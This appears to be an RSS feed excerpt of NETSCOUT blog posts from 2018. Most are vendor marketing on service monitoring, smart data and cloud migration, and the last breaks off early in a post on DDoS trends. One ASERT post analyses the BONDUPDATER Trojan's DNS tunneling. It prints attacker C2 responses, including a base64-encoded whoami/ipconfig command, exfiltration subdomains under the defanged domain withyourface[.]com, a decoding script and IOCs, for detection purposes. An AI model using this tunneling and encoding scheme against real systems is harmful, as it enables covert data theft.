<p>For this exercise, I separate out the functions of the digital service as follows; overall service health, application, service dependency mapping, end-user response time, sessions, forensics, physical and system errors, physical system and connectivity health and finally security. These subjects will be dealt with in turn, but at the end, a process will be shown that ties them all back together so that overall service health can be measured, quantified and triaged should problems occur within.</p>

<p><strong><u>Overall Service Health</u></strong></p>

<p>Is there a way in your organisation of <a href="https://www.netscout.com/solutions/service-assurance?ls=PR-MKTG&amp;lsd=blog-092018-4">scoring the health or security of an application</a>? Keeping tabs on this and understanding the baseline is a way of maintaining the organisation’s digital health and security under constant scrutiny, maximising cost savings for the organisation and optimising the end user’s experience. The end user may be a member of the organisation or a member of the public. Maximising the end user experience can increase adoption of the alternative digital service and improving the efficiencies in the system.</p>

<p>A baseline is useful in understanding how the service changes over time, how it reacts under abnormal loads in times of stress, for example when a deadline for tax returns is approached, or holiday season means an uptick in passport applications. How does the service react, does it expand flexibly if cloud-based, for example, and how does the service cope under pressure?</p>

<p>Once a baseline has been measured then this can be used to track abnormalities in the baseline to look at exceptions from this baseline as evidence of degradation of the service leading to inefficiencies and increasing costs.</p>

<p><strong><u>Application</u></strong></p>

<p>The application should be the focus of the exercise after all this is what replaces the paper system and is the reason for building the system in the first place. Example applications may be applying for a driving license, filling in a tax return, applying for a pension or arranging a doctor’s appointment.</p>

<p>While developers build their applications in a test environment with near perfect conditions and with user loading not understood, an application once deployed becomes a system of multiple variables.</p>

<p>When deployed, does the organisation have a way of <a href="https://www.netscout.com/solutions/application-performance?ls=PR-MKTG&amp;lsd=blog-092018-5">spotting application errors</a> that may not be apparent to the application, the application developer or the end user? These might only start to become evident in end-user response time increases and vagaries in the system which may go unreported for a time after they start.</p>

<p>Very often these errors are hidden in arcane communications between components of the service. The service will have many components due to layers within it and for redundancy purposes. These different components then each have their multiple dependencies to help run the service, authenticate the users and distribute information between the components of the service.</p>

<p>How is each conversation working at the application layer and is any component complaining to another with an application error? Monitoring these conversations is a way of seeing this.</p>

<p><strong><u>Service Dependency Mapping</u></strong></p>

<p>In the early days of developing an application, the right size or structure of an application may not be apparent.</p>

<p>As a service matures or migrates platforms and people leave, skills and knowledge about the makeup of a service get lost in time.</p>

<p>Is it possible within your organisation to map out what makes up a service, how it communicates and what it is dependent on? This logic map can then inform an organisation at a time of system or platform migration about what and how the service may be increased, moved and changed.</p>

<p><strong><u>End User response time</u></strong></p>

<p>At the end of a service is a user. We have probably all experienced the turning hourglass, the spinning circle on our browsers or the filling task execution bar. Often these waits are acceptable, but all too often these delays become frustrating. These times of frustration make end users lose faith in the system and cause costs to rise and efficiencies to decrease.</p>

<p>Does your organisation have a way of measuring these response times? Are they baselined and understood? Are they rectified when they become unacceptable either by increasing capacity or fixing issues, or they little understood and rely on anecdotal evidence from end users, which cause hours of endless searching and triage?</p>

<p><strong><u>Overall Service Health</u></strong></p>

<p>Each department, agency or organisation might have multiple services to deliver. Each of these services will have their own and sometimes common components. Does your organisation have a way of scoring these applications independently and against each other so that priorities can be intelligently set?</p>

<p>These scorecards of performance could then be shared within the organisations to raise awareness between towers to help the organisation with its purpose, by using report, alerts and dashboards.</p>

<p>These scorecards and overall health methods should be independent of the service and use a common methodology to compare with each other rather than comparing scores derived in different manners. This makes it easier to determine how services are operating from the third-party viewpoint.</p>

<p><strong><u>Sessions</u></strong></p>

<p>With a service having multiple components, each of the conversations between the components is made up of multiple sessions. By monitoring each session and then rolling them into a session health score, makes it easier to spot failed sessions and when conversations start to get inefficient. Inefficient conversations lead to increasing end-user responses and a loss of money and increasing use of resources, both infrastructural and personal.</p>

<p><strong><u>Forensics</u></strong></p>

<p>If there are issues of inefficiencies in the system, to what level of forensics is your organisation able to go to? Forensics are required for <a href="https://www.netscout.com/solutions/sip-peering?ls=PR-MKTG&amp;lsd=blog-092018-6">in-depth triage</a>, for reporting and communications issues within and between tower services.</p>

<p>If too little forensic data can be seen at the time of issues this leads to having to wait for the issue to happen again while using spot forensics, hastily set up, increasing triage time.</p>

<p>Machine data is often stored, but sometimes this is not enough to understand the underlying issues.</p>

<p><strong><u>Physical and System Errors</u></strong></p>

<p>Even in the best-designed system, there will be over-capacity reached at times. This is because a system or service is designed for optimal cost and capacity reasons. Catering for the last few percentiles in system capacity increases the cost of the systems beyond all proportion of the benefits that it brings.</p>

<p>When a system is over-capacity and data spills from the system is it possible to spot these occurrences and make sure that they are kept within acceptable limits?</p>

<p><strong><u>Physical System and Connectivity Health</u></strong></p>

<p>While system monitoring may be employed, how does it tie in with the above topics and how can it be correlated with the service audit functions above. Does your organisation have a way of tying all the topics above with a common dataset, or are all the datasets collected in isolation without a way of correlating them together except maybe by time and by eye?</p>

<p>Is it possible to map out the physical setup of services within your organisation? This can then inform if they are all running compatibly with each other and with no unexpected or lengthy paths between service dependencies.</p>

<p><strong><u>Security</u></strong></p>

<p>Lastly, we reach the topic of security. Implementing a regime above is not without its cost, although the cost saving of doing so often outweigh the investment many times. But implementing the methodology also increases security.</p>

<p>Legitimate conversations can be characterised and therefore illegitimate conversations also highlighted.</p>

<p><a href="https://www.netscout.com/what-is-ddos/">Distributed denial of service (DDoS) attacks</a> can also be seen in conversations, and these can then be mitigated against. Denial of service may take the form of <a href="https://www.netscout.com/what-is-ddos/volumetric-attacks">volumetric attacks</a> (literally loading the system with illegitimate and huge amounts of traffic), state exhaustion attacks, (loading up a system with a known amount of sessions which will make it stop working or behave erratically, which behaviour can then be exploited by a hacker) and application layer attacks which exploit known vulnerabilities in applications. Using a monitoring methodology above can help spot these attacks as they are happening.</p>

<p>Finally, with security, is the level of forensics sufficient to spot and stop infiltration and a possible exfiltration of data within your service and systems.&nbsp; Is it possible to compare what is happening within your system with what is happening to other systems worldwide to react to zero-day attacks from unscrupulous actors?</p>

<p><strong><u>How Can NETSCOUT Help?</u></strong></p>

<p>Business assurance combines service assurance, cyber security and business analytics solutions for IT and security operations. We harness the full power of internet protocol intelligence, obtained from network traffic, as the common data foundation for all these applications.</p>

<p>Our customers solve <a href="https://www.netscout.com/case-study/global-fashion-retailer-reduces-mttr?ls=PR-MKTG&amp;lsd=blog-092018-8">problems faster</a>, protect their business from cyber-attacks and obtain the best intelligence for insightful and timely business analysis.</p>

<p>NETSCOUT is the only company to support service assurance, packet broker, cyber security and big data analytics from a common technology platform.</p>

<p>More information can be found <a href="https://www.youtube.com/watch?v=JuJy7dGKUZ4" target="_blank">here, in a 2 minute video</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/uk%209.20.18.jpg" length="784017" type="image/jpeg"/>
    <guid isPermaLink="false">93c0dafd-cfb1-43f6-bb53-97873113ba11</guid>
    <pubDate>Thu, 20 Sep 2018 11:43:46 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Adam Woolhouse</dc:creator>
    </item>
<item>
  <title>Using Smart Data for Operational Intelligence</title>
  <link>http://localhost:7996/blog/using-smart-data-operational-intelligence</link>
  <description>As business success increasingly hinges on how well organizations access and analyze data, it is not surprising to find companies pursuing smart data architectures that enable them to leverage data faster and more effectively. Done right, smart data helps improve customer experiences and loyalty, save money, protect revenue, and even meet compliance requirements. Most...</description>
  <content:encoded><![CDATA[<p>As business success increasingly hinges on how well organizations access and analyze data, it is not surprising to find companies pursuing smart data architectures that enable them to leverage data faster and more effectively.&nbsp;</p>

<p>Done right, smart data helps improve customer experiences and loyalty, save money, protect revenue, and even meet compliance requirements.&nbsp; Most importantly, it becomes key to driving successful digital transformation efforts.</p>

<p>This is no small matter, as a recent <a href="https://hbr.org/2017/01/what-the-companies-on-the-right-side-of-the-digital-business-divide-have-in-common" target="_blank">Harvard Business Review study</a> shows that digital transformation leaders perform much better than lagging companies in areas such as gross margins, earnings, and net income.&nbsp; And for those leaders, using data well is a lynchpin to success.</p>

<p>According to the report, such companies are “more likely to have a comprehensive data acquisition strategy and differentiate themselves from competitors based on their data platform. This difference in strategy means that business users are more likely to have access to a consistent set of up-to-date metrics for decision making, and the organization can generate predictions about their business from data they collect.”</p>

<p>As timeliness and the ability to quickly create meaningful insights are cornerstones of smart data, small wonder that this approach is becoming an important element of such strategies.</p>

<p><strong>Smart data at work</strong></p>

<p>So how does smart data work in real life? Unsurprisingly, we will focus on one of NETSCOUT’s smart data platforms, which incorporates smart data technology that provides visibility and intelligence into the entirety of the service experience, including performance, security, and quality:</p>

<p><strong>Adaptive Service Intelligence (ASI) </strong>technology transforms wire traffic, or packet, data into real-time, condensed, user performance metrics and threat awareness indicators without losing the ability to dig into the&nbsp;details.</p>

<p>ASI-based smart data conveys critical key performance, traffic, error, and server indicators for service assurance and performance, and delivers service dependency mapping that exposes the underlying inter-relationships and connectivity between applications, servers, and users.</p>

<p>Having this pervasive, real-time, deep view into the circulatory system of your digital organization makes all manners of things possible, as the examples below demonstrate:</p>

<ol>
	<li><strong>Healthcare provider cuts time to patient care</strong></li>
</ol>

<p>A leading US healthcare organization with 1,200 physicians and 15,000 full-time employees needed to get to the bottom of lengthy delays when opening cardiology images.&nbsp; Since these test results were often crucial diagnostic tools for newly admitted patients, the time lag was more than a nuisance—lives were at stake.</p>

<p>The image files were handled by the organization’s Radiology Information System (RIS), and IT spent several weeks in war rooms with a group of vendors, including the RIS vendor, trying to track down the source of the problem. Unfortunately, the team lacked visibility into the virtualized applications servers hosting the radiology services.</p>

<p>Already a NETSCOUT customer, the provider expanded its existing deployment by adding vSTREAM virtual appliances to the virtualized radiology application servers in its private data center.</p>

<p>The results were illuminating. Once IT was able to extend its north-south analysis across the data center with newly deployed east-west traffic visibility within the virtualized server environment, the group discovered that radiology application servers were storing those cardiac images in their third-party public cloud storage for long-term retention rather than keeping them on premises for immediate access during urgent-care patient treatment.&nbsp; Armed with that knowledge, the organization was able to work with the RIS vendor on a rewrite of its software to correct the problem.</p>

<p>In doing so, the team cut that 20-minute lag to seconds, giving healthcare workers instant access to the information needed to care for patients and work more efficiently.</p>

<ol start="2">
	<li><strong>Manufacturer speeds revenue capture</strong></li>
</ol>

<p>The growing complexity of computing environments is one of the new realities driving the need for smart data.&nbsp; With so much data and so many system interdependencies, it is increasingly hard to keep everything flying in formation.</p>

<p>Consider this manufacturer of canned goods.&nbsp; Every Friday afternoon employees loaded pallets onto trucks, using bar code scanners to register the loads. This process signaled the moment the company could recognize revenue for that shipment.&nbsp;</p>

<p>But it took five minutes to read the bar code and resolve it to the accounting and production databases, which slowed the truck line, &nbsp;idled employees, and delayed revenue recognition.</p>

<p>By applying nGeniusONE analytics to NETSCOUT ASI smart data, the company discovered that the same server supporting the bar code readers was also configured to perform database backups at the same time on Fridays, which ate into the cycles used to support the scanning process.</p>

<p>Once the backup schedule was shifted to after midnight, the bottleneck cleared: no more overtime paid to IT employees, loading dock workers, or finance employees, and revenue began to flow freely again.</p>

<ol start="3">
	<li><strong>Cloud service provider ducks social media fiasco</strong></li>
</ol>

<p>A European cloud service provider that supplies third-party outsourced IP solutions, including Unified Communications as a Service, was hampered by a performance degradation that included dropped calls, severe echo, bad dial tones, and a host of other quality problems.&nbsp; Although the company had a dozen tools to help track such problems, the disruptions continued and, in some cases, resulted in full-day outages.&nbsp;</p>

<p>As customers took to social media to vent their frustration, sales started to sputter.</p>

<p>The company turned to the NETSCOUT ASI-based smart data platform, which includes specialized analysis of unified communications and collaboration services.&nbsp; According to the data center manager, smart data essentially reduced troubleshooting procedures from two days down to an hour, helping the company quickly pinpoint problems across this complex, multi-vendor unified communications environment.&nbsp;</p>

<ol start="4">
	<li><strong>Cloud migration </strong></li>
</ol>

<p>One increasingly common use for smart data is to support the migration of applications to cloud environments.&nbsp; Whether you are lifting and shifting or refactoring your applications in the process, you don’t want to complete the migration only to find a host of service issues.&nbsp;</p>

<p>Many companies use smart data both pre- and post-migration. The first step allows them to find all the interdependencies and services &nbsp;in use, which can then be applied to the company’s ongoing planning process—including such things as current application response times and utilization information.&nbsp; Once the new cloud service is in production,&nbsp; the baseline data collected during pre-deployment helps IT make sure that user expecations are met and vendor service-level compliance is ensured.</p>

<p>When it comes to IT operations, smart data from wire traffic is becoming a must-have for digitally driven organizations, especially given the fact that IT environments are increasingly complex and involve a growing list of external suppliers that are outside of your direct control.&nbsp;</p>

<p>~<em>Written by John Dix. John is an IT industry veteran who has chronicled major shifts in IT since the emergence of distributed processing in the early ‘80s. An award-winning writer and editor, he was the editor-in-chief for NetworkWorld for many years and an analyst for research firm IDC.</em></p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/smart%20data%20operational%20intelligence.jpg" length="109702" type="image/jpeg"/>
    <guid isPermaLink="false">5b76d12f-5ea2-466c-8637-7d87723382d6</guid>
    <pubDate>Wed, 19 Sep 2018 17:20:00 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>John Dix</dc:creator>
    </item>
<item>
  <title>Tunneling Under the Sands</title>
  <link>http://localhost:7996/blog/asert/tunneling-under-sands</link>
  <description>ASERT recently came across spear-phishing emails targeting the Office of the First Deputy Prime Minister of Bahrain.</description>
  <content:encoded><![CDATA[<h2>Executive Summary</h2>

<p>ASERT recently came across spear-phishing emails targeting the Office of the First Deputy Prime Minister of Bahrain. A similar campaign uncovered by Palo Alto’s <a href="https://researchcenter.paloaltonetworks.com/2018/09/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/">Unit 42</a>&nbsp;found the activity distributing an updated variant of <a href="https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html">BONDUPDATER</a>, a PowerShell-based Trojan, which they attribute to Iranian APT group OilRig (aka APT34).&nbsp; ASERT was able to uncover Command and Control (C2) traffic instructing the script to run commands, including the C2 responses from the attacker’s server. <strong><em>NOTE</em></strong><em>: Netscout APS enterprise security products detect and block all network IOCs noted in this report.</em></p>

<h2>Key Findings</h2>

<ul>
	<li>BONDUPDATER, a PowerShell based Trojan, now obfuscates the data prior to exfiltration.</li>
	<li>Data exfiltration occurs using inserted sub-domains for each communication to the attacker’s C2 server.</li>
</ul>

<h2>Analysis</h2>

<p>During the course of ASERT's investigation into the alleged Oilrig activity, we managed to capture live C2 communications, and reverse engineer the communication protocols the malware uses.&nbsp; For further details on the malware itself and how it behaves, we recommend reading the blog that Unit42 <a href="https://researchcenter.paloaltonetworks.com/2018/09/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/">security researchers</a> published earlier in the week. The BONDUPDATER C2 communications utilize DNS queries for communication and data exfiltration.&nbsp; Specifically, BONDUPDATER uses DNS A records and DNS TXT records to relay the information.</p>

<h2>Command Delivery</h2>

<p>BONDUPDATER makes use of the TXT data field to pass commands to the client.&nbsp; DNS TXT records are traditionally used to provide additional information about the domain; however, it could be anything, provided it follows the standard.&nbsp; Here, the attacker abuses the functionality to deliver items like commands. The command format the attackers send in the TXT response field is: <em>5 characters &gt; Data</em> (Figure 1).&nbsp;</p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/09/TXT-Command.png"><img alt="" class="wp-image-9619 size-full" height="32" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/09/TXT-Command.png" width="684" /></a> <em>Figure 1: S0000 Command</em></p>

<p>The script splits the command into two parts delimited by the &gt; character.&nbsp; For example, to run a simple command on the victim machine, the attacker would respond to three separate DNS TXT queries with the following responses:</p>

<ol>
	<li>S000s&gt;10100
	<ol>
		<li>Create a file under the receivedbox folder called rcvd10100</li>
	</ol>
	</li>
	<li>S0000&gt;d2hvYW1pJmlwY29uZmlnIC9hbGw=
	<ol>
		<li>Decode command to the right of &gt;
		<ol>
			<li>Replace('-', '+')</li>
			<li>Replace('_', '/')</li>
			<li>Base64 Decode</li>
		</ol>
		</li>
	</ol>
	</li>
	<li>&nbsp;E0000&gt;0
	<ol>
		<li>Write the decoded command to the file</li>
	</ol>
	</li>
</ol>

<h2>Data Exfiltration</h2>

<p>Normal DNS A records are used to return an IP address for the given domain or subdomain.&nbsp; BONDUPDATER abuses DNS A records for data exfiltration.&nbsp; We observed BONDUPDATER sending the output of a CLI command across multiple DNS A requests (Figure 2).&nbsp; The data was stuffed into one of the subdomains.&nbsp; Using this method, the attacker may pull down any file provided they remain undetected for a prolonged period of time to successfully transfer the required data.&nbsp; Data exfiltration, using this method, takes time and generates a large number of requests that could be noticed by network IDS/IPS.<a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/09/withyourface_wireshark.png"><img alt="" class="wp-image-9622 size-full" height="520" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/09/withyourface_wireshark.png" width="2908" /></a> <em>Figure 2. Exfiltrating Data</em></p>

<p>BONDUPDATER exfiltrates files by adding two more subdomains to the FQDN.</p>

<h3>Data Subdomain</h3>

<p>The first of the two inserted subdomains contains one of three possible entries:</p>

<ol>
	<li>Data exfiltration header</li>
	<li>Data being exfiltrated</li>
	<li>Data exfiltration end marker</li>
</ol>

<p>The following strings represent the same data exfiltration header presented here in two forms:</p>

<ul>
	<li>Un-obfuscated: &lt;redacted&gt;. 10100*9056*****************.33333210100A[.]withyourface[.]com</li>
	<li>Obfuscated: &lt;redacted&gt;.<strong>COCTab33333233332222222222222222210100A9056AAAAAAAAAAAAAAAAA</strong>.33333210100A[.]withyourface[.]com</li>
</ul>

<p>BONDUPDATER sends the data using the obfuscated form.&nbsp; The un-obfuscated form was added for clarity. “COCTab” indicates this subdomain is a data exfiltration header.&nbsp; The next 5 characters match the name received by the S000s command (above).&nbsp; The actors add these characters to map the data being received to the command they issued.&nbsp; The script obfuscates all the data of this subdomain except for the “COCTab” header. BONDUPDATER obfuscates&nbsp;the file content, sent to the attacker.</p>

<ul>
	<li>&lt;redacted&gt;.<strong>EBB466767667256666772556776662FBFD932F3F64079E4F730B65239FE0</strong>.33333210100A[.]withyourface[.]com</li>
</ul>

<p>&nbsp; The obfuscation technique is covered in the next section. &nbsp; The final entry type, “COCTabCOCT”, denotes the end of the data segment:</p>

<ul>
	<li>&lt;redacted&gt;.<strong>COCTabCOCT</strong>.33333210100A[.]withyourface[.]com</li>
</ul>

<h3>Data Obfuscation Technique</h3>

<p>The actor obfuscates the data by splitting each byte into two nibbles. The first nibble goes into one list and the second nibble goes into the second list.&nbsp; Each list contains a max of 15 characters but may have less depending on the number of remaining bytes.&nbsp; The script joins the lists together end to end to create the subdomain (Figure 3).&nbsp;</p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/09/Tunneling-Under-the-Sands-Obfuscation.png"><img alt="" class="wp-image-9620 size-full" height="860" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/09/Tunneling-Under-the-Sands-Obfuscation.png" width="1278" /></a> <em>Figure 3: Binary Scrambling</em></p>

<p>The script below reorganizes the nibbles into their respective bytes (Figure 4).</p>

<pre>
import binascii
data = 'EBB466767667256666772556776662FBFD932F3F64079E4F730B65239FE0'
exfil_data = []
for x in range(int(len(data)/2)):
&nbsp;&nbsp;&nbsp; try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exfil_data.append(binascii.unhexlify(data[x] + data[int(len(data)/2)+x]))
&nbsp;&nbsp;&nbsp; except:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exfil_data.append(data[x] + data[int(len(data)/2)+x])
print(''.join(exfil_data))
</pre>

<p><em>Figure 4: Python2 snippet to reconstruct the data</em></p>

<p>The above code snippet returns: <em>Microsoft Windows [Version</em>, which is part of the output when running the following command:</p>

<ul>
	<li>whoami&amp;ipconfig /all</li>
</ul>

<h3>Command Identification Marker</h3>

<p>The third level subdomain contains an identification marker as noted below:</p>

<ul>
	<li>&lt;redacted&gt;.COCTabCOCT.<strong>33333210100A</strong>[.]withyourface[.]com</li>
</ul>

<p>The value equals the command identifier specified by the S000s command (above).&nbsp; Similar to a campaign ID/name, it is likely the attackers use this marker to categorize and sort C2 communications.&nbsp; This subdomain also uses the same algorithm defined in Figure 3.</p>

<h2>Summary &amp; Recommendations</h2>

<p>APT actors continually revamp and develop new capabilities to add to their portfolio and BONDUPDATER is no exception. The custom DNS tunneling and obfuscation technique allows the attacker to circumvent some defense measures. From a defender’s perspective, ASERT recommends that all DNS traffic be monitored for abnormal behavior such as abnormally long domain names.&nbsp; At a minimum, inspect DNS A records for “COCTab” which could be a sign of this specific infection.&nbsp; Practice good email hygiene and disable scripts from running in Office documents where possible.&nbsp; Enable PowerShell logging to monitor for suspicious behavior. Research into this group and specifically BONDUPDATER, reveals that the actor is continuously improving their toolset to maximize their chances of success.&nbsp; Thus, layered controls are essential for detecting the threats of tomorrow.</p>

<h2>IOCs</h2>

<ul>
	<li>withyourface[.]com</li>
	<li>52b6e1ef0d079f4c2572705156365c06 - Word Document</li>
	<li>8c4fa86dcc2fd00933b70cbf239f0636 - PowerShell Script</li>
</ul>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/Tunneling-Under-the-Sands-Obfuscation%20%281%29.png" length="332542" type="image/png"/>
    <guid isPermaLink="false">a00fbd49-0f1b-4886-989d-7f2bfde154ce</guid>
    <pubDate>Fri, 14 Sep 2018 18:13:28 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Improving Performance and Service Delivery Dominate Top Priorities in Hybrid Cloud</title>
  <link>http://localhost:7996/blog/improving-performance-and-service-delivery-dominate-top-priorities</link>
  <description>Most companies have begun migrating workloads to the cloud. But did you know that speeding up operations, optimizing costs, and improving performance and service delivery are the top goals of IT professionals? That’s just one of several key findings of a new survey conducted by IEEE Computer Society of behalf of NETSCOUT. The organization surveyed 303 IT professionals from...</description>
  <content:encoded><![CDATA[<p>Most companies have begun migrating workloads to the cloud. But did you know that speeding up operations, optimizing costs, and improving performance and service delivery are the top goals of IT professionals?</p>

<p>That’s just one of several key findings of a new survey conducted by <a href="https://www.computer.org/" target="_blank">IEEE Computer Society</a> of behalf of NETSCOUT. The organization surveyed 303 IT professionals from January to March 2018, and found that more than half (56%) have already started migrating workloads to the cloud while another 15% will start the migration process within the next 12 months.</p>

<p>When asked to identify the primary business goals for migrating to the cloud, the most common response was IT operations speed and agility, cited by 61% of the respondents. That was followed by optimized costs (shifting CapEx to OpEx), at 56%; and improve performance and service delivery to business customers, mentioned by 49%.</p>

<p>The survey results confirm the importance of cloud migration to organizations and the widespread use of migration resources already in place.</p>

<p>The adoption of cloud services entered the mainstream several years ago with enterprises first adopting the cloud for software-as-a-service (SaaS) offerings such as CRM, and then moving workloads to cloud service provider (CSP) data centers to compute close to where their data is stored or to provide extra capacity and improved flexibility, says Cliff Grossner, senior research director and advisor, Cloud and Data Center Research Practice, at <a href="https://ihsmarkit.com/index.html" target="_blank">IHS Markit</a>.</p>

<p>“In recent years, CSPs have developed specialized hardware, such as Google’s Tensor Processing Unit, for artificial intelligence and machine learning, and enterprises are migrating workloads to access specialized compute instances,” Grossner says.</p>

<p>The promise of the cloud has been unwavering since its inception, Grossner says: providing a means for enterprises to more quickly turn up or throttle back IT infrastructure delivering applications, improve application performance with the latest infrastructure run by highly skilled personnel, and enable consistent functionality connecting cloud service provider data centers with on-premises data centers and end users across the global via multi-clouds.</p>

<p>Security and compliance is the top challenge when adopting and managing hybrid cloud environments, cited by 62% of the organizations. The next most common challenges are preventing data loss (51%) and minimizing service downtime (47%).</p>

<p>Security breaches and downtime are critical issues for enterprises, Grossner says, with significant consequences when they occur. “Enterprises have made significant investments in protecting their on-premises data centers and need to be certain they are not exposed to new unmitigated attack vectors when migrating to the cloud,” he says. “Until they feel off-premises public cloud security is on-par, many enterprises will opt to use a hybrid approach, keeping their sensitive data in private data centers.”</p>

<p>The top applications targeted for migration to the cloud are Web services (84% of respondents), and unified communications and collaboration (61%).</p>

<p>In-house developed Web services applications are a natural target for migrating to the cloud, Grossner says. “They are architected using a traditional three-tier architecture, where each tier can be scaled independently,” he says. “Many enterprises migrate Web servers to the cloud, allowing them to scale very rapidly as demand changes while keeping the back-end logic on premises.”</p>

<p>Unified communications and collaboration applications such as Microsoft Office 365 are often consumed as SaaS, Grossner says, as enterprises are offloading the burden of maintaining on-premises software that can demand frequent installations of updates and patches.</p>

<p>The applications less likely to be migrated to the cloud are human resources management and proprietary enterprise applications, according to the survey.</p>

<p>Respondents were asked about their performance monitoring strategy for applications and workloads migrated to the cloud, and nearly 40% said the best strategy is to implement methods</p>

<p>for pervasive visibility of traffic flows on-premises and in private and public clouds. About one quarter said the best strategy is to conduct active synthetic service performance testing for SaaS environments.</p>

<p>For enterprises that have adopted a DevOps process for continuous delivery, monitoring application performance in the cloud is a key concern.</p>

<p>“DevOps teams run the risk of restricting the overall flow of the value stream to customers,” says Ron Lifton, senior solutions marketing manager at NetScout Systems. “Bytecode, server-centric application performance management technologies can’t keep pace with delivering innovation and new experiences quickly for customers.”</p>

<p>As such, moving applications to the cloud requires a DevOps transformation to reduce risk, Lifton says. “Risk is best managed by having more information; more importantly, the right information that comes from end-to-end system-level telemetry,” he says. “An application performance management solution for the hybrid cloud that uses smart data, powered by the acquisition and transformation of traffic flow data, provides system-level telemetry and unobstructed visibility anywhere along the service delivery path.</p>

<p>Such a solution allows DevOps to fully understand the inherent complexities of application workloads in hybrid cloud environments and not compromise user experience, Lifton says.</p>

<p>When survey respondents were asked where they see gaps or shortcomings in maintaining the visibility they need to deliver cloud services before, during and after migration, 45% cited a lack of correlation and situational awareness across disparate tools. Another shortcoming was cloud provider platforms not being sufficient to meet service assurance needs, cited by at 40%.</p>

<p>“Previously you had to rely on incomplete data like byte code instrumentation or piecemeal instrumentation because of APM limitations or narrowly focused platform-specific monitoring,” Lifton says. “Unfortunately, the continuous deployment pipeline is often hindered by APM or silo-specific monitoring challenges, putting operations at risk of becoming a bottleneck to deploying services in the cloud and negatively impacting customer experience.</p>

<p><a href="https://www.netscout.com/solutions/smart-data?ls=PR-MKTG&amp;lsd=blog-1-091218">NETSCOUT offers Adaptive Service Intelligence (ASI) technology</a> that allows IT organizations to acquire smart data and get visibility into the deepest parts of the network and applications, on-premises and in cloud environments.</p>

<p>“While the usual DevOps mantra is to accomplish more with fewer resources, using a system-level telemetry platform complements software development automation by accelerating deployments. Real-time and continuous monitoring of traffic flow data allows for a common situational awareness and an effective analytics feedback loop,” Lifton says.</p>

<p>Respondents were also asked to identify what the DevOps key performance indicators are in hybrid cloud environments. Application reliability, availability, and responsiveness in production environments was the most common response (59%).</p>

<p>“Bytecode-based APM tools have a feedback loop constrained by server-centric application telemetry, and as a result DevOps have service delivery ‘blind spots’ in the production environment,” Lifton says. “This is a real issue for teams responsible for delivering specific app functions and who are on the front line to continuously deliver and support them.”</p>

<p>With migration to the cloud has come a paradigm shift from server-centric to workload-centric performance management, Lifton says. Application performance management has now tipped to operations because of cloud migration and the need for a superior feedback loop based on workload-centric system-level telemetry.</p>

<p>“As the continuous deployment pipeline grows, the burden of optimizing application performance and assuring service delivery increases for operations,” Lifton says. “IT professionals must spend more time and effort managing service complexity. If a function fails from a software perspective, it can be huge in terms of application performance degradation the customer will experience.”</p>

<p>Therefore, protecting the continuous deployment pipeline and assuring application reliability, availability and responsiveness requires smart data to get big picture, infrastructure-wide visibility and understanding of service dependencies in a dynamic environment.&nbsp;</p>

<p>You can learn more about NETSCOUT’s Smart Data-driven approach to DevOps <a href="https://www.netscout.com/smart-data-visibility?ls=PR-MKTG&amp;lsd=blog-2-091218">here</a>.&nbsp;</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/top_concerns_hybrid_cloud.jpg" length="897596" type="image/jpeg"/>
    <guid isPermaLink="false">68af60c2-1e41-47aa-b4a4-b013a341ad25</guid>
    <pubDate>Thu, 13 Sep 2018 13:49:47 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Entering the Terabit Era: Get Ready For Bigger DDoS Attacks</title>
  <link>http://localhost:7996/blog/entering-terabit-era-get-ready-bigger-ddos-attacks</link>
  <description>According to NETSCOUT’s ATLAS Security Engineering and Response Team (ASERT), the maximum size of DDoS attacks increased 174% in the first half of 2018 over the same period in 2017.</description>
  <content:encoded><![CDATA[<p>Security professionals have long concerned themselves with the growing volume and frequency of DDoS attacks. With thousands of attacks reportedly underway at any given time somewhere in the world, large institutions have had to steel their defenses against what is for many a daily event. In the <a href="https://www.netscout.com/threatreport?utm_source=Blog">NETSCOUT Threat Landscape Report</a>, our researchers observed that the frequency of attacks actually declined between 2017 and 2018. However, any sense of relief this news might bring to beleaguered security teams is quickly offset by another alarming trend: attacks are multiplying in size, often far exceeding what many service providers consider a safe defensive capacity. DDoS has entered the terabit era.</p>

<p>According to NETSCOUT’s ATLAS Security Engineering and Response Team (ASERT), the maximum size of DDoS attacks&nbsp;increased 174% in the first half of 2018 over the same period in 2017. In fact, the largest attack ever witnessed, at <a href="https://www.netscout.com/news/blog/security-17tbps-ddos-attack-makes-history?ls=PR-MKTG&amp;lsd=blog-1-090518">1.7 Tbps</a>, struck a NETSCOUT Arbor customer, a large North American service provider, in February 2018. Fortunately, with the well designed and distributed nature of the customer’s architecture, their incident response preparedness, combined with their multi-layered Arbor DDoS solution, they were able to successfully mitigate the attack with no downtime. Still, this attack underscores the new reality that defenses designed to counteract attacks in the 300 Gbps range are no longer adequate. Even an infrastructure with a 1 terabit defensive capacity is at risk.</p>

